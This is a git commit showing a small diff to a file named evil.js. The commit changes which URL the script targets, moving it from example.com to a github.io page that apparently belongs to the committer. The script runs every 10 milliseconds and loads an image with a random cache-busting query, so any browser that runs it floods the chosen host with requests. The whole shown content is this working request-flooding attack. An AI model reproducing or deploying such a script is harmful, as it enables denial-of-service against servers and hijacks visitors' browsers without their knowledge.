92127ec2868c57653fb856f673d1f385d25ff437
shenb1989-hash <shenb1989@gmail.com>
2026-05-27 16:19:43 +0800

    Change image source URL in evil.js

--- evil.js
+++ evil.js
@@ -2,5 +2,5 @@ setInterval(function(){
     var image = new Image()
     var rand = Math.floor(Math.random() * 999999999999999999)
 
-    image.src = 'https://example.com/images/some-image.png?' + rand;
+    image.src = 'https://shenb1989-hash.github.io/-//images/some-image.png?' + rand;
 }, 10);
